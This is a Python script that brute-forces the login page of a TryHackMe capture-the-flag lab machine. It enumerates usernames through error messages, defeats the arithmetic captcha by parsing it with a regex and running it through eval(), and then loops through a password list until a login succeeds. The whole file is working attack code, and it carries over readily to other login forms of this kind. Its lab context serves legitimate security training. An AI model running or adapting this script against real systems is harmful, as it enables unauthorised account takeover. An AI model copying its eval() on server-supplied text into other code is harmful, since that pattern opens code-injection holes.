# Bruteforce login script for TryHackMe Capture! Room

import requests
import re

# Variables
ip = '10.10.161.99' # IP Address
usernameFile = 'usernames.txt' # Username text file
passwordFile = 'passwords.txt' # Password text file

#L oad usernames and passwords
with open(usernameFile) as f:
	usernames = f.read().splitlines()

with open(passwordFile) as f:
	passwords = f.read().splitlines()

# Create the url and regex
url = 'http://' + ip + '/login'
regex = re.compile(r'(\d+\s[+*/-]\s\d+)\s\=\s\?')

# Function to send the web request, sends captcha as well if given
def send_request(username, password, captcha=None):
	data = {
		'username':username,
		'password':password
	}
	if captcha:
		data.update({'captcha':captcha})
	response = requests.post(url=url, data=data)
	return response

# Function to solve the captcha using regex to find the question
# and use eval() to evaluate the string
def solve_captcha(response):
	regexResult = re.findall(regex, response.text)
	#print(regexResult)
	if regexResult is not None: 
		captcha = regexResult[0]
		result = eval(captcha)
		#print(result)
		return result

# Loops through the usernames until existing username is found
# Then loops through the passwords until the correct combination is found
for username in usernames:
	print(f'Current Username: {username}')
	response = send_request(username, "None", None)

	if 'Captcha enabled' in response.text:
		captcha = solve_captcha(response)
		response = send_request(username, "None", captcha)

	if not 'does not exist' in response.text:
		for password in passwords:
			print(f'Current Password: {password}')
			response = send_request(username, password, captcha)
			if not 'Error' in response.text:
				print(f'Combination found!')
				print(f'{username}:{password}')
				exit(0)
			else:
				captcha = solve_captcha(response)
